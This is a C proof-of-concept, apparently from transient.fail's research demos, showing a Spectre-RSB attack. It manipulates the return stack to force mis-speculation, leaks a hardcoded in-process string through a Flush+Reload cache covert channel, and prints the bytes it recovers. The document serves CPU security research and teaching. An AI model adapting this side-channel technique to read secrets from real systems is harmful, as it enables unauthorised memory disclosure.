/*
  Source code adapted from transient.fail
  Spectre RSB
  Same address space, out of place (sa_oop)
*/
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "cacheutils.h"

// inaccessible secret
#define SECRET "INACCESSIBLE SECRET"

// #define SECRET "SSSSSSSSSSSSSSSSSSS"

unsigned char data[128];
int idx;

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
#endif
  return 0;
}

int __attribute__ ((noinline)) call_leak() {
  // Manipulate the stack so that we don't return here, but to call_start
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  cache_encode(SECRET[idx]);
  return 2;
}

int __attribute__ ((noinline)) call_start() {
  call_leak();
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  call_start();
  call_leak();
  call_manipulate_stack();
}

int main(int argc, const char **argv) {
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  if(!pagesize)
    pagesize = sysconf(_SC_PAGESIZE);

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  // flush our shared memory
  flush_shared_memory();
  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET)] = 0;

  idx = 0;
  int secret_idx = 0;
  while(1) {
    // for every byte in the string
    idx = (idx + 1) % sizeof(SECRET);
    
    call_start();

    // Recover data from covert channel
    for(int i=0;i<256;i++) {
        int mix_i = ((i*167)+13)&255;
        if(flush_reload(mem + mix_i * pagesize)) {
            if(mix_i == SECRET[secret_idx]) {
                printf("%c", mix_i);
                secret_idx++;
            }
            fflush(stdout);
        }
        if(secret_idx == sizeof(SECRET) -1) {
            printf("\nSuccess!\n");
            exit(0);
        }
    }
  }

  return (0);
}
